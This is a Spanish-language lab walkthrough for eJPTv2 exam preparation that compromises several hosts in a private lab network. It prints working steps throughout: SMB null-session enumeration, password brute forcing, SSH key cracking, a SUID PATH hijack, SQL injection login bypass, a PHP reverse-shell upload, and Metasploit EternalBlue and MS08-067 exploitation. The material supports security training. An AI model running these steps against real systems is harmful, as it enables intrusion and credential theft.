# Laboratorio de preparación eJPTv2
## Herramientas recomendadas
- Nmap
- Dirbuster
- Nikto
- WPScan
- CrackMapExec
- Metasploit
- Searchsploit
- Hydra

## Enumeración
```bash
nmap -sn 10.0.2.0/24 # Comprobar conectividad
```

Se tienen 5 IPs alcanzables por el atacante. Para ello, se anotan las direcciones IP y se agregan en el diagrama.

- Host1: 10.0.2.43
- Host2: 10.0.2.45
- Host3: 10.0.2.46
- Host4: 10.0.2.53
- Host5: 10.0.2.55

Ahora, vamos a hacer un escaneo de puertos en estos 5 hosts con el siguiente comando:

```bash
sudo nmap -sS --min-rate 5000 -p- --open 10.0.2.43,45,46,53,55 -oN tcp_scan.txt
```

Una vez terminado el escaneo, se despliega en la terminal el resultado de los puertos abiertos con sus respectivos servicios. Lo que nos interesa ahora es enumerar las versiones de los servicios.

```bash
grep '^[0-9]' tcp_scan.txt # Empiezan con algún número

grep '^[0-9]$' tcp_scan.txt # Terminan con algún número
```

```bash
grep '^[0-9]' tcp_scan.txt | cut -d '/' -f1 # Se separa por "/" y se obtiene la data de la izquierda (1)

grep '^[0-9]' tcp_scan.txt | cut -d '/' -f1 | sort -u # Ordenar y filtrar por puerto único

grep '^[0-9]' tcp_scan.txt | cut -d '/' -f1 | sort -u | xargs # Formato de lista

grep '^[0-9]' tcp_scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ',' # Se reemplazan los espacios por comas
```

Ahora hacemos un escaneo dirigido:

```bash
nmap -p135,139,22,25,443,49665,49670,80 -sC -sV 10.0.2.43,45,46,53,55 --open -Pn -oN full_scan.txt
```

Se obtienen los nombres de los hosts, por lo que se procede a agregar esta información en el diagrama.

## Primer objetivo: 10.0.2.43
Lo primero es crear un entorno para esta máquina:
```bash
mkdir 10.0.2.43
cd 10.0.2.43
```

### Puerto 80
Se decide explorar el puerto 80 de esta IP, donde se encuentra una imagen. 
Se debe ver el código fuente con Ctrl + U. 

Aquí podemos hacer enumeración de directorios con dirbuster. 

```bash
http://10.0.2.53:80
```

> Wordlist: `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`

Se desactiva el `Brute force Files` y `Be Recursive` para que sea más rápido el escaneo. Además, se cambia la cantidad de threads a 200.

No parece haber nada interesante, por lo que el siguiente puerto a revisar es 139 y 445 (SMB).

### Puerto 139 y 445
Se van a utilizar las 4 herramientas de enumeración de SMB: smbclient, smbmap, crackmapexec y enum4linux.

```bash
smclient -L //10.0.2.43 -N # Permite listar archivos compartidos mediante el uso de una sesión nula
```

La desventaja es que no lista los permisos que se tienen sobre esos recursos compartidos. 

- print$
- helios
- anonymous
- IPC$

```bash
smbmap -H 10.0.2.43 # Sirve para listar los recursos con sus respectivos permisos
```

`anonymous` tiene permisos de `READ ONLY`.

```bash
crackmapexec smb 10.0.2.43 -u '' -p '' --shares # Equivalente a una null session
```

```bash
enum4linux 10.0.2.43 # Tiene muchísima más información (usuarios)
```

```bash
smbclient //10.0.2.43/anonymous
smbclient //10.0.2.43/anonymous -N # Sesión nula
```

Aquí podemos encontrar archivos interesantes.

```bash
get archivo.txt
```

Podemos enumerar usuarios de la siguiente manera:
```bash
crackmapexec smg 10.0.2.43 -u '' -p '' --users # Para enumerar usuarios
```

Aquí encontramos un usuario llamado `helios` con las contraseñas en texto plano, por lo que debemos colocar:

```bash
crackmapexec smb 10.0.2.43 -u helios -p passwords.txt
```

Lamentablemente, las contraseñas para este usuario no son las correctas.

Sin embargo, usando smbmap...
```bash
smbmap -H 10.0.2.43 -u helios -p qwerty
```

Puede ocurrir que con ciertas herramientas funciona y en otras no, utilizando las mismas contraseñas. Esto se debe tener en cuenta.

```bash
smbclient //10.0.2.43/helios -U helios
# > Ponemos la contraseña 
```

```bash
mget * # Para descargar todos los archivos del directorio

prompt
mget *
```

Se logra encontrar una ruta oculta que no pudo ser encontrada a través de dirbuster (esto es porque es una ruta específica). Al ingresar notamos que existe una página hecha con WordPress, por lo que conviene leer su código fuente.

Existe virtual hosting, por lo que debemos modificar el archivo `/etc/hosts` agregando la dirección IP de la máquina y la URL, provocando que el attacker host sea una especie de DNS local.

Una vez modificado este archivo, procedemos a entrar al virtual host especificado y visualizamos el WordPress de forma correcta.

Entramos a `/wp-admin` y probamos distintos usuarios.

> Drupal (drupscan), Joomla (joomscan)

Ya conociendo un usuario, podemos realizar un ataque de fuerza bruta.

```bash
wpscan -U admin -P /usr/share/wordlists/rockyou.txt --url http://symfonos.local/h3l105/

wpscan --url http://symfonos.local/h3l105/
```

Con este escaneo nos muestra los plugins y sus versiones correspondientes, por lo que podemos buscar vulnerabilidades conocidas en `searchsploit`.

```bash
searchsploit wordpress mail masta
# Se ofrecen 3 exploits 
searchsploit wordpress site editor
# Se ofrecen 2 exploits

searchsploit -x 40290 # Inspeccionamos el exploit

searchsploit -m 40290 # Se trae a la máquina de atacante

cat 40290.txt
```

Con Local File Inclusion (LFI) se puede acceder a `/etc/passwd` y enumerar más usuarios.

Una forma de pasar de LFI a Remote Command Execution, se podría ocupar un id_rsa de un usuario válido del sistema para entrar a la máquina sin introducir una contraseña.

El `id_rsa` se suele ubicar en `/home/user/.ssh/id_rsa`. Sin embargo, está encriptada. 

> Permission denied (publickey): Significa que se permite el inicio de sesión con clave privada.

```bash
ssh -i id_rsa helios@10.0.2.43
```

Ahora da un error distinto. Se necesita darle permisos con: `chmod 600 id_rsa`, pero nos pide un passphrase.

Para saber esta contraseña podemos ocupar:

```bash
ssh2john id_rsa > hashes.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Y se logra entrar a esta máquina. 

### Dentro del objetivo: 10.0.2.43
Se procede a hacer una enumeración del host con:
```bash
sudo -l # Command not found
cat /etc/crontab

find / -perm -4000 -ls 2>/dev/null 
```

Aquí encontramos un archivo con permisos SUID, siendo el que destaca más `/opt/statuscheck`. 

¿Cómo podemos saber qué está haciendo esta herramienta?

```bash
file /opt/statuscheck
```

```bash
strings /opt/statuscheck
```

> curl -I H http://localhost

¿Qué pasa si cambiamos el PATH?

```bash
export PATH=/tmp:$PATH
echo $PATH

cd /tmp
nano curl # Va a contener el tipo de shell que quiero obtener cuando se ejecute este ataque
> /bin/bash -p

chmod +x curl
file curl

./curl # Se inicia una sesión dentro de esta sesión

/opt/statuscheck
```

Y así logramos escalar privilegios.

## Segundo objetivo: 10.0.2.53

Solamente se tiene abierto el puerto 80. No se está accediendo correctamente a los recursos para desplegar visualmente la página, por lo que podría tener que ver un virtual hosting.

Vemos el código fuente y encontramos un dominio `doc.hmv`, por lo que lo añadimos a `/etc/hosts`.

Vamos a ocupar nikto (escáner de vulnerabilidades web)
```bash
nikto -url http://doc.hmv
```

Encontramos un `/config.php` y un `/admin/login.php`.

Probamos credenciales usuales y con Hydra. 

Para ver si hay un SQL Injection, podemos poner un `';-- -`. Pero no ocurre ningún error. 

Probamos con `' OR 1=1;-- -`. ¡Funciona! ¿Pero por qué?

Esta es una consulta usual:

```sql
SELECT * FROM Users WHERE username = 'xerox' AND password = 'password';

SELECT * FROM Users WHERE username = 'xero' OR 1=1; -- -' AND password = 'password';
```

Podemos ocupar BurpSuite para interceptar la petición, y luego así automatizar la SQL Injection con `sqlmap`.

> Copy to file > 10.0.2.53 > post_request

Incluye el método, cabeceras, host, parámetros...

```bash
sqlmap -r post_request
```

Existe la posibilidad de subir una imagen para el administrador, por lo que tenemos que verificar que se esté haciendo una sanitización de los nombres de los archivos que se suban. Tenemos que verificar también la ruta a la que se suben estas imágenes, y aquí notamos que existía una carpeta que fue encontrada anteriormente. 

Existe una página llamada `revshells.com` que nos permite hacer reverse shells. Dentro de ella, hay una opción llamada `PHP PentestMonkey`. Queremos una shell de tipo bash y se configuran la IP y puerto (atacante).

Se ha subido la "imagen", pero se ha renombrado.

Antes de subir el archivo, debemos ponernos en escucha en la parte del atacante:

```bash
nc -lvnp 443
```

```bash
script /dev/null -c bash
stty raw -echo;fg
reset
export SHELL=bash TERM=xterm

stty -a
stty rows 40 columns 157
```

```bash
cat /etc/passwd

cd /var/www/html/traffic_offense/
ls -la

cat config.php
cat initialize.php
```


Una vez vemos estos archivos notamos que existen credenciales que son potencialmente válidas para el sistema, no solamente para la base de datos.

```bash
su bella
```

Efectivamente funcionan las credenciales. 

## Tercer objetivo: 10.0.2.45
Tenemos el servicio RPC (135), 139 y 445 (SMB) en un dispositivo Windows XP con usuario EXPERIENCE.

```
nmap -p445 --script='smv-vuln-*' 10.0.2.45
```


La máquina parece ser vulnerable a 2 tipos de ataques:
- MS08-067
- MS17-010 (EternalBlue)

```bash
msfconsole

search ms17-010

use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.0.2.45
# setg RHOSTS 10.0.2.45
run
```

Comprobamos que efectivamente es vulnerable.

```bash
search ms17-010
use 0
run
```

El problema es que este módulo solamente soporta x64.

```bash
use 1
run
```

Y ahora tenemos una shell de tipo `meterpreter` en la víctima.

```bash
getuid
```

> NT AUTHORITY\SYSTEM

Esto nos confirma que tenemos los más altos privilegios existentes.

Podemos obtener una shell dentro de Windows con `shell`.

```bash
search ms08-067
use exploit/windows/smb/ms08_067_netapi
run
```

Y... ¡Tenemos la sesión abierta!